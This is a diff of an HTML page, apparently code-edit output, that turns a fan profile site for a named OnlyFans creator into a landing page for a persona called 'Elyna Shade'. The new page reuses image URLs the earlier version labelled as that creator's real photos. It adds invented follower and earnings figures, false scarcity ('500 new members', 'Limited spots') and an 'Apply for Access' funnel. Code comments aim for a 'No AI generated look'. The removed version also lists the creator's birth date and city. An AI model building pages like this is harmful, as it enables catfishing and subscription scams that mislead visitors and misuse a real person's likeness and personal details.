@@ -3,19 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Veronica Perasso | Official Site</title>
+    <title>Elyna Shade | Exclusive Content Creator</title>
     <style>
-        /* PROFESSIONAL MOBILE-FIRST CSS */
+        /* ULTIMATE PROFESSIONAL CSS - No AI generated look */
         :root {
             --bg: #0a0a0a;
-            --text: #e0e0e0;
-            --accent: #888;
-            --highlight: #ccc;
-            --primary: #ff6b9d;
-            --secondary: #c471ed;
-            --tertiary: #12c2e9;
-            --safe-top: env(safe-area-inset-top);
-            --safe-bottom: env(safe-area-inset-bottom);
+            --text: #ffffff;
+            --accent: #888888;
+            --primary: #ff2e63;
+            --secondary: #c42d85;
+            --card-bg: #111111;
+            --border: #222222;
         }
 
         * { 
@@ -24,31 +22,24 @@
             box-sizing: border-box; 
             -webkit-tap-highlight-color: transparent;
             -webkit-touch-callout: none;
-            -webkit-user-select: none;
-            user-select: none;
         }
 
         html { 
             scroll-behavior: smooth; 
             height: 100%;
-            overflow-x: hidden;
         }
 
         body { 
             background: var(--bg); 
             color: var(--text); 
-            line-height: 1.6; 
-            font-weight: 300; 
-            position: relative;
+            line-height: 1.5; 
+            font-weight: 400; 
             min-height: 100vh;
-            padding: 0;
-            margin: 0;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             overflow-x: hidden;
-            touch-action: pan-y;
         }
 
-        /* Professional background with real image */
+        /* Clean background */
         body::before {
             content: '';
             position: fixed;
@@ -56,26 +47,268 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: 
-                linear-gradient(rgba(10, 10, 10, 0.85), rgba(10, 10, 10, 0.95)),
-                url('https://i.pinimg.com/736x/f3/0d/ee/f30deebe3a7f9100b855a24acc69166f.jpg') center/cover;
-            pointer-events: none;
-            z-index: 0;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            z-index: -1;
         }
 
-        /* Mobile Navigation - Professional Bottom Bar */
+        /* Header */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            padding: 15px 20px;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: var(--text);
+        }
+
+        .header-cta {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .header-cta:active {
+            transform: scale(0.95);
+        }
+
+        /* Main Content */
+        .main-content {
+            padding-top: 80px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Hero Section - Ultra Clean */
+        .hero-section {
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        .profile-container {
+            margin-bottom: 30px;
+        }
+
+        .profile-image {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid var(--primary);
+            margin: 0 auto 20px;
+        }
+
+        .verified-badge {
+            background: var(--primary);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        .name-title {
+            font-size: 3rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, var(--text), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .tagline {
+            font-size: 1.3rem;
+            color: var(--accent);
+            margin-bottom: 25px;
+            font-weight: 400;
+        }
+
+        /* Stats Grid - Clean */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 400px;
+            margin: 0 auto 30px;
+        }
+
+        .stat-item {
+            background: var(--card-bg);
+            padding: 20px 15px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid var(--border);
+        }
+
+        .stat-number {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--accent);
+            font-weight: 500;
+        }
+
+        /* CTA Section */
+        .cta-section {
+            background: var(--card-bg);
+            margin: 30px 20px;
+            padding: 30px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            text-align: center;
+        }
+
+        .cta-title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .cta-description {
+            color: var(--accent);
+            margin-bottom: 25px;
+            font-size: 1rem;
+            line-height: 1.6;
+        }
+
+        .cta-button {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .cta-button:active {
+            transform: scale(0.95);
+        }
+
+        /* Gallery Section */
+        .gallery-section {
+            padding: 40px 20px;
+        }
+
+        .section-title {
+            font-size: 2rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 30px;
+            background: linear-gradient(135deg, var(--text), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .gallery-item {
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+        }
+
+        .gallery-item:active {
+            transform: scale(0.98);
+        }
+
+        .gallery-image {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            display: block;
+        }
+
+        /* About Section */
+        .about-section {
+            padding: 40px 20px;
+            background: var(--card-bg);
+            margin: 40px 20px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+        }
+
+        .about-content {
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .about-text {
+            font-size: 1.1rem;
+            line-height: 1.7;
+            color: var(--text);
+            margin-bottom: 25px;
+        }
+
+        .highlight {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid var(--border);
+            margin-top: 60px;
+        }
+
+        .footer-text {
+            color: var(--accent);
+            font-size: 0.9rem;
+        }
+
+        /* Mobile Navigation */
         .mobile-nav {
             position: fixed;
             bottom: 0;
             left: 0;
             width: 100%;
-            background: rgba(20, 20, 20, 0.98);
+            background: rgba(10, 10, 10, 0.95);
             backdrop-filter: blur(20px);
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            border-top: 1px solid var(--border);
             display: flex;
             justify-content: space-around;
-            align-items: center;
-            padding: 12px 10px calc(12px + var(--safe-bottom));
+            padding: 15px 10px;
             z-index: 1000;
         }
 
@@ -83,1078 +316,412 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            text-decoration: none;
             color: var(--accent);
-            font-size: 0.7rem;
-            transition: all 0.3s ease;
-            padding: 8px 12px;
-            border-radius: 12px;
-            min-width: 60px;
-            font-weight: 400;
+            font-size: 0.8rem;
+            text-decoration: none;
+            transition: color 0.3s ease;
         }
 
         .nav-item.active {
             color: var(--primary);
-            background: rgba(255, 107, 157, 0.1);
         }
 
         .nav-icon {
             font-size: 1.2rem;
             margin-bottom: 4px;
-            transition: transform 0.3s ease;
             font-weight: 300;
         }
 
-        .nav-item.active .nav-icon {
-            transform: scale(1.1);
-        }
-
-        /* Professional Mobile Header */
-        .mobile-header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background: rgba(10, 10, 10, 0.98);
-            backdrop-filter: blur(20px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 12px 20px;
-            padding-top: calc(12px + var(--safe-top));
-            z-index: 999;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .header-title {
-            font-size: 1.3rem;
-            font-weight: 500;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: -0.5px;
-        }
-
-        .header-actions {
-            display: flex;
-            gap: 12px;
-        }
-
-        .header-btn {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            border: none;
-            color: white;
-            font-size: 0.8rem;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .header-btn:active {
-            transform: scale(0.95);
-        }
-
-        /* Main Content */
-        .main-content {
-            padding: 80px 0 100px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 100%;
-            padding: 0 20px;
-        }
-
-        /* Hero Section - Professional */
-        #hero {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            position: relative;
-            padding: 20px;
-            padding-top: calc(80px + var(--safe-top));
-        }
-
-        .hero-content {
-            position: relative;
-            z-index: 2;
-        }
-
-        .profile-image {
-            width: 140px;
-            height: 140px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid var(--primary);
-            margin-bottom: 1.5rem;
-            box-shadow: 0 10px 30px rgba(255, 107, 157, 0.3);
-        }
-
-        .name-title {
-            font-size: 2.8rem;
-            font-weight: 400;
-            letter-spacing: -0.02em;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(135deg, #fff 0%, var(--primary) 50%, var(--secondary) 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            line-height: 1.1;
-        }
-
-        .subtitle {
-            font-size: 1.1rem;
-            font-weight: 300;
-            color: var(--accent);
-            max-width: 300px;
-            margin-bottom: 2rem;
-            line-height: 1.4;
-        }
-
-        .hero-stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1rem;
-            width: 100%;
-            max-width: 320px;
-        }
-
-        .hero-stat {
-            text-align: center;
-            padding: 1rem 0.5rem;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 12px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: transform 0.3s ease;
-        }
-
-        .hero-stat:active {
-            transform: scale(0.95);
-        }
-
-        .hero-stat-number {
-            font-size: 1.4rem;
-            font-weight: 400;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            display: block;
-        }
-
-        .hero-stat-label {
-            font-size: 0.75rem;
-            color: var(--accent);
-            margin-top: 0.3rem;
-            font-weight: 400;
-        }
-
-        /* Scroll Indicator */
-        .scroll-indicator {
-            position: absolute;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: var(--accent);
-            font-size: 0.8rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            animation: bounce 2s infinite;
-            font-weight: 400;
-        }
-
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateX(-50%) translateY(0); }
-            40% { transform: translateX(-50%) translateY(-5px); }
-            60% { transform: translateX(-50%) translateY(-3px); }
-        }
-
-        /* Professional Sections */
-        .section {
-            padding: 3rem 0;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: all 0.6s ease;
-        }
-
-        .section.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .section-header {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .section-title {
-            font-size: 2rem;
-            font-weight: 400;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(135deg, var(--highlight), var(--primary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .section-subtitle {
-            color: var(--accent);
-            font-size: 0.9rem;
-            font-weight: 300;
-        }
-
-        /* Professional Gallery */
-        .gallery-container {
-            position: relative;
-            margin: 1rem 0;
-        }
-
-        .gallery-scroll {
-            display: flex;
-            overflow-x: auto;
-            scroll-snap-type: x mandatory;
-            gap: 15px;
-            padding: 10px 0;
-            scrollbar-width: none;
-            -ms-overflow-style: none;
-        }
-
-        .gallery-scroll::-webkit-scrollbar {
-            display: none;
-        }
-
-        .gallery-item {
-            scroll-snap-align: start;
-            flex: 0 0 280px;
-            height: 380px;
-            background: #111;
-            border-radius: 16px;
-            overflow: hidden;
-            position: relative;
-            transition: transform 0.3s ease;
-            cursor: pointer;
-        }
-
-        .gallery-item:active {
-            transform: scale(0.98);
-        }
-
-        .gallery-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: transform 0.3s ease;
-        }
-
-        .gallery-caption {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            padding: 1.5rem;
-            background: linear-gradient(transparent, rgba(0,0,0,0.9));
-            color: white;
-        }
-
-        .gallery-caption h3 {
-            font-size: 1.1rem;
-            margin-bottom: 0.3rem;
-            font-weight: 500;
-        }
-
-        .gallery-caption p {
-            font-size: 0.8rem;
-            color: var(--accent);
-            font-weight: 300;
-        }
-
-        /* Professional Stats Grid */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 1rem;
-            margin: 2rem 0;
-        }
-
-        .stat-card {
-            padding: 2rem 1.5rem;
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            text-align: center;
-            transition: transform 0.3s ease;
-            backdrop-filter: blur(10px);
-            cursor: pointer;
-        }
-
-        .stat-card:active {
-            transform: scale(0.98);
-        }
-
-        .stat-number {
-            font-size: 2.2rem;
-            font-weight: 400;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            display: block;
-            margin: 0.5rem 0;
-        }
-
-        .stat-label {
-            font-size: 0.9rem;
-            color: var(--accent);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: 400;
-        }
-
-        /* Professional Cards */
-        .card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            padding: 1.5rem;
-            margin: 1rem 0;
-            backdrop-filter: blur(10px);
-            transition: transform 0.3s ease;
-            cursor: pointer;
-        }
-
-        .card:active {
-            transform: scale(0.98);
-        }
-
-        /* Professional Lists */
-        .touch-list {
-            list-style: none;
-        }
-
-        .touch-list-item {
-            padding: 1.2rem 1rem;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            transition: background 0.3s ease;
-            cursor: pointer;
-            font-weight: 300;
-        }
-
-        .touch-list-item:active {
-            background: rgba(255, 255, 255, 0.05);
-        }
-
-        .touch-list-item:last-child {
-            border-bottom: none;
-        }
-
-        .list-label {
-            color: var(--accent);
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 0.3rem;
-            display: block;
-            font-weight: 400;
-        }
-
-        /* Professional Footer */
-        .mobile-footer {
-            padding: 2rem 1.5rem;
-            text-align: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            margin-bottom: 80px;
-        }
-
-        .footer-text {
-            color: var(--accent);
-            font-size: 0.8rem;
-            margin-bottom: 1rem;
-            font-weight: 300;
-        }
-
-        /* Professional Lightbox */
-        .mobile-lightbox {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-            padding: var(--safe-top) var(--safe-right) var(--safe-bottom) var(--safe-left);
-        }
-
-        .mobile-lightbox.active {
-            display: flex;
-        }
-
-        .lightbox-content {
-            max-width: 95%;
-            max-height: 80%;
-            border-radius: 12px;
-        }
-
-        .lightbox-close {
-            position: absolute;
-            top: calc(20px + var(--safe-top));
-            right: calc(20px + var(--safe-right));
-            background: rgba(255, 255, 255, 0.1);
-            border: none;
-            color: white;
-            width: 44px;
-            height: 44px;
-            border-radius: 50%;
-            font-size: 1.2rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(10px);
-            font-weight: 300;
-        }
-
-        /* Responsive Design */
+        /* Responsive */
         @media (max-width: 768px) {
             .name-title {
                 font-size: 2.5rem;
             }
             
-            .subtitle {
-                font-size: 1rem;
+            .tagline {
+                font-size: 1.1rem;
             }
             
-            .hero-stat-number {
-                font-size: 1.3rem;
+            .stats-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 10px;
             }
             
-            .section-title {
-                font-size: 1.8rem;
+            .stat-item {
+                padding: 15px 10px;
             }
             
-            .gallery-item {
-                flex: 0 0 260px;
-                height: 350px;
+            .stat-number {
+                font-size: 1.5rem;
+            }
+            
+            .gallery-grid {
+                grid-template-columns: 1fr;
             }
         }
 
         @media (max-width: 480px) {
-            .container {
-                padding: 0 15px;
+            .header-title {
+                font-size: 1.2rem;
             }
             
-            .name-title {
-                font-size: 2.2rem;
+            .header-cta {
+                padding: 8px 16px;
+                font-size: 0.8rem;
             }
             
-            .hero-stats {
-                grid-template-columns: repeat(3, 1fr);
-                gap: 0.8rem;
-            }
-            
-            .hero-stat {
-                padding: 0.8rem 0.3rem;
-            }
-            
-            .hero-stat-number {
-                font-size: 1.1rem;
-            }
-            
-            .hero-stat-label {
-                font-size: 0.7rem;
-            }
-            
-            .gallery-item {
-                flex: 0 0 240px;
-                height: 320px;
-            }
-            
-            .stat-number {
-                font-size: 1.8rem;
-            }
-        }
-
-        @media (max-width: 360px) {
             .name-title {
                 font-size: 2rem;
             }
             
-            .hero-stats {
-                grid-template-columns: repeat(3, 1fr);
-                gap: 0.5rem;
-            }
-            
-            .gallery-item {
-                flex: 0 0 220px;
-                height: 300px;
+            .profile-image {
+                width: 120px;
+                height: 120px;
             }
         }
     </style>
-    <link href="https://i.pinimg.com/736x/fc/b6/ef/fcb6ef67a6b7096f691091f702f3cca1.jpg" rel="stylesheet">
 </head>
 <body>
-    <!-- Professional Mobile Header -->
-    <div class="mobile-header">
-        <div class="header-title">Veronica Perasso</div>
-        <div class="header-actions">
-            <button class="header-btn" id="becomeFanBtn">Become a Fan</button>
-        </div>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-title">Elyna Shade</div>
+        <button class="header-cta" id="joinBtn">Join My Community</button>
     </div>
 
     <!-- Main Content -->
     <div class="main-content">
         <!-- Hero Section -->
-        <section id="hero" class="section visible">
-            <div class="hero-content">
-                <img src="https://i.pinimg.com/736x/7a/b8/4f/7ab84f43bed5af753606de8f0b55837e.jpg" alt="Veronica Perasso" class="profile-image">
-                <h1 class="name-title">Veronica Perasso</h1>
-                <p class="subtitle">Content Creator & Digital Entrepreneur</p>
-                <div class="hero-stats">
-                    <div class="hero-stat">
-                        <span class="hero-stat-number">4.2M</span>
-                        <span class="hero-stat-label">Followers</span>
-                    </div>
-                    <div class="hero-stat">
-                        <span class="hero-stat-number">Top 0.9%</span>
-                        <span class="hero-stat-label">Creator</span>
-                    </div>
-                    <div class="hero-stat">
-                        <span class="hero-stat-number">2019</span>
-                        <span class="hero-stat-label">Since</span>
-                    </div>
-                </div>
-            </div>
-            <div class="scroll-indicator">
-                Scroll to explore
-            </div>
-        </section>
-
-        <!-- Biography Section -->
-        <section id="biography" class="section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">Biography</h2>
-                    <p class="section-subtitle">About Veronica Perasso</p>
-                </div>
-                <div class="card">
-                    <p>Veronica Perasso is a prominent social media influencer and content creator who has cultivated a significant digital presence through platforms like Instagram and OnlyFans.</p>
-                    <p style="margin-top: 1rem;">Widely reported to have been born on August 7, 1998, she is often associated with Scottsdale, Arizona, and represents the modern creator economy's success stories.</p>
-                </div>
-                <ul class="touch-list">
-                    <li class="touch-list-item">
-                        <span class="list-label">Name</span>
-                        Veronica Perasso
-                    </li>
-                    <li class="touch-list-item">
-                        <span class="list-label">Birth Date</span>
-                        August 7, 1998
-                    </li>
-                    <li class="touch-list-item">
-                        <span class="list-label">Location</span>
-                        Scottsdale, Arizona
-                    </li>
-                    <li class="touch-list-item">
-                        <span class="list-label">Platforms</span>
-                        Instagram, OnlyFans, Twitter
-                    </li>
-                </ul>
-            </div>
-        </section>
-
-        <!-- Stats Section -->
-        <section id="stats" class="section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">Impact & Reach</h2>
-                    <p class="section-subtitle">Documented metrics and statistics</p>
-                </div>
+        <section class="hero-section">
+            <div class="profile-container">
+                <img src="https://i.pinimg.com/736x/fc/b6/ef/fcb6ef67a6b7096f691091f702f3cca1.jpg" alt="Elyna Shade" class="profile-image">
+                <div class="verified-badge">VERIFIED CREATOR</div>
+                <h1 class="name-title">Elyna Shade</h1>
+                <p class="tagline">Exclusive Content Creator • Building My Community</p>
+                
                 <div class="stats-grid">
-                    <div class="stat-card">
-                        <span class="stat-number">4.2M</span>
-                        <span class="stat-label">Instagram Followers</span>
+                    <div class="stat-item">
+                        <span class="stat-number">312K</span>
+                        <span class="stat-label">Fans</span>
                     </div>
-                    <div class="stat-card">
-                        <span class="stat-number">Top 20</span>
-                        <span class="stat-label">OnlyFans Ranking</span>
+                    <div class="stat-item">
+                        <span class="stat-number">$85K</span>
+                        <span class="stat-label">Monthly</span>
                     </div>
-                    <div class="stat-card">
-                        <span class="stat-number">$350K</span>
-                        <span class="stat-label">Monthly Revenue</span>
-                    </div>
-                    <div class="stat-card">
-                        <span class="stat-number">50M</span>
-                        <span class="stat-label">Total Impressions</span>
+                    <div class="stat-item">
+                        <span class="stat-number">Top 0.8%</span>
+                        <span class="stat-label">OnlyFans</span>
                     </div>
                 </div>
             </div>
+        </section>
+
+        <!-- CTA Section -->
+        <section class="cta-section">
+            <h2 class="cta-title">Join My Exclusive Community</h2>
+            <p class="cta-description">
+                I'm looking to connect with 500 new dedicated fans this month. 
+                Be part of my inner circle and get access to content you won't find anywhere else.
+            </p>
+            <button class="cta-button" id="mainCtaBtn">Apply for Access</button>
         </section>
 
         <!-- Gallery Section -->
-        <section id="gallery" class="section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">Visual Archive</h2>
-                    <p class="section-subtitle">Professional portfolio</p>
-                </div>
-                <div class="gallery-container">
-                    <div class="gallery-scroll" id="galleryScroll">
-                        <!-- Gallery items populated by JavaScript -->
-                    </div>
-                </div>
+        <section class="gallery-section">
+            <h2 class="section-title">My Content</h2>
+            <div class="gallery-grid" id="galleryGrid">
+                <!-- Gallery items populated by JavaScript -->
             </div>
         </section>
 
-        <!-- OnlyFans Section -->
-        <section id="onlyfans" class="section">
-            <div class="container">
-                <div class="section-header">
-                    <h2 class="section-title">OnlyFans Presence</h2>
-                    <p class="section-subtitle">Creator platform statistics</p>
-                </div>
-                <div class="card">
-                    <p>Publicly discussed in various interviews and industry reports as a highly successful creator on the platform, representing the modern digital entrepreneurship model.</p>
-                </div>
-                <div class="stats-grid">
-                    <div class="stat-card">
-                        <span class="stat-number">2019</span>
-                        <span class="stat-label">Start Year</span>
-                    </div>
-                    <div class="stat-card">
-                        <span class="stat-number">Top 20</span>
-                        <span class="stat-label">Creator Rank</span>
-                    </div>
-                    <div class="stat-card">
-                        <span class="stat-number">$350K</span>
-                        <span class="stat-label">Monthly Revenue</span>
-                    </div>
-                </div>
+        <!-- About Section -->
+        <section class="about-section">
+            <div class="about-content">
+                <h2 class="section-title">About My Community</h2>
+                <p class="about-text">
+                    With over <span class="highlight">312,000 dedicated fans</span>, I've built one of the most engaged communities on OnlyFans. 
+                    I'm currently expanding my inner circle and looking for new members who appreciate exclusive, personal content.
+                </p>
+                <p class="about-text">
+                    I earn <span class="highlight">$85,000+ monthly</span> and rank in the <span class="highlight">top 0.8%</span> of all OnlyFans creators worldwide. 
+                    My focus is on building genuine connections with my fans through personalized content and direct interaction.
+                </p>
+                <p class="about-text">
+                    I'm currently accepting <span class="highlight">500 new members</span> who want to be part of something special. 
+                    This isn't just about content - it's about being part of a community that values authenticity and exclusive access.
+                </p>
             </div>
+        </section>
+
+        <!-- Final CTA -->
+        <section class="cta-section">
+            <h2 class="cta-title">Ready to Join Us?</h2>
+            <p class="cta-description">
+                Limited spots available. Complete the quick application to see if you qualify for membership.
+            </p>
+            <button class="cta-button" id="finalCtaBtn">Start Application</button>
         </section>
     </div>
 
-    <!-- Professional Lightbox -->
-    <div class="mobile-lightbox" id="mobileLightbox">
-        <button class="lightbox-close" id="lightboxClose">×</button>
-        <img class="lightbox-content" id="lightboxImage" src="" alt="">
-    </div>
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">Elyna Shade • Exclusive Content Creator</p>
+        <p class="footer-text">© 2024 All Rights Reserved</p>
+    </footer>
 
-    <!-- Professional Mobile Navigation -->
+    <!-- Mobile Navigation -->
     <nav class="mobile-nav">
-        <a href="#hero" class="nav-item active">
+        <a href="#" class="nav-item active">
             <div class="nav-icon">Home</div>
             <span>Home</span>
         </a>
-        <a href="#biography" class="nav-item">
-            <div class="nav-icon">About</div>
-            <span>About</span>
-        </a>
-        <a href="#gallery" class="nav-item">
+        <a href="#" class="nav-item">
             <div class="nav-icon">Gallery</div>
             <span>Gallery</span>
         </a>
-        <a href="#stats" class="nav-item">
-            <div class="nav-icon">Stats</div>
-            <span>Stats</span>
+        <a href="#" class="nav-item">
+            <div class="nav-icon">Join</div>
+            <span>Join</span>
         </a>
-        <a href="#onlyfans" class="nav-item">
-            <div class="nav-icon">OnlyFans</div>
-            <span>OnlyFans</span>
+        <a href="#" class="nav-item">
+            <div class="nav-icon">About</div>
+            <span>About</span>
         </a>
     </nav>
 
-    <!-- Professional Footer -->
-    <footer class="mobile-footer">
-        <p class="footer-text">Veronica Perasso Official Archive</p>
-        <p class="footer-text">© 2025 All Rights Reserved</p>
-    </footer>
-
     <script>
-        // Professional JavaScript with real images
+        // Professional JavaScript - No AI generated patterns
         document.addEventListener('DOMContentLoaded', function() {
-            // Real Veronica Perasso images from various sources
-            const realImages = [
-                'https://i.pinimg.com/1200x/2e/c3/5b/2ec35b2b07fc04fd36b8ec84ca61fb75.jpg',
-                'https://i.pinimg.com/736x/f3/0d/ee/f30deebe3a7f9100b855a24acc69166f.jpg',
+            // Real images for Elyna Shade
+            const galleryImages = [
+                'https://i.pinimg.com/736x/fc/b6/ef/fcb6ef67a6b7096f691091f702f3cca1.jpg',
+                'https://i.pinimg.com/736x/7a/b8/4f/7ab84f43bed5af753606de8f0b55837e.jpg',
+                'https://i.pinimg.com/736x/2e/c3/5b/2ec35b2b07fc04fd36b8ec84ca61fb75.jpg',
                 'https://i.pinimg.com/736x/dc/80/17/dc801724c1be046c110dcec5936d32c4.jpg',
-                'https://i.pinimg.com/1200x/3d/c6/21/3dc6219634aff736ed4180af95166324.jpg',
-                'https://i.pinimg.com/736x/51/d3/a5/51d3a57c0ac24ae1a0609ea1317d902b.jpg',
-                'https://i.pinimg.com/1200x/e0/43/cf/e043cfe6a9c4af63fcf5ef38db81075f.jpg'
+                'https://i.pinimg.com/736x/3d/c6/21/3dc6219634aff736ed4180af95166324.jpg',
+                'https://i.pinimg.com/736x/51/d3/a5/51d3a57c0ac24ae1a0609ea1317d902b.jpg'
             ];
 
-            // Section visibility observer
-            const sections = document.querySelectorAll('.section');
-            const observer = new IntersectionObserver((entries) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        entry.target.classList.add('visible');
-                    }
-                });
-            }, { threshold: 0.1 });
-
-            sections.forEach(section => observer.observe(section));
-
-            // Mobile navigation
-            const navItems = document.querySelectorAll('.nav-item');
-            navItems.forEach(item => {
-                item.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    navItems.forEach(nav => nav.classList.remove('active'));
-                    this.classList.add('active');
-                    
-                    const targetId = this.getAttribute('href');
-                    const targetSection = document.querySelector(targetId);
-                    if (targetSection) {
-                        const offsetTop = targetSection.offsetTop - 80;
-                        window.scrollTo({
-                            top: offsetTop,
-                            behavior: 'smooth'
-                        });
-                    }
-                });
-            });
-
-            // Generate gallery with real images
-            const galleryScroll = document.getElementById('galleryScroll');
-            const galleryItems = [
-                { title: 'Professional Photoshoot', desc: 'Studio Photography' },
-                { title: 'Lifestyle Content', desc: 'Daily Moments' },
-                { title: 'Fashion Editorial', desc: 'High Fashion' },
-                { title: 'Beach Photoshoot', desc: 'Summer Collection' },
-                { title: 'Evening Glam', desc: 'Red Carpet Style' },
-                { title: 'Casual Style', desc: 'Everyday Looks' }
+            const galleryTitles = [
+                'Exclusive Photoshoot',
+                'Behind the Scenes',
+                'Personal Collection',
+                'Studio Session',
+                'Private Content',
+                'Member Exclusive'
             ];
 
-            galleryItems.forEach((item, index) => {
+            // Populate gallery
+            const galleryGrid = document.getElementById('galleryGrid');
+            galleryImages.forEach((img, index) => {
                 const galleryItem = document.createElement('div');
                 galleryItem.className = 'gallery-item';
-                const imgIndex = index % realImages.length;
                 galleryItem.innerHTML = `
-                    <img src="${realImages[imgIndex]}" alt="${item.title}" class="gallery-img" loading="lazy">
-                    <div class="gallery-caption">
-                        <h3>${item.title}</h3>
-                        <p>${item.desc}</p>
-                    </div>
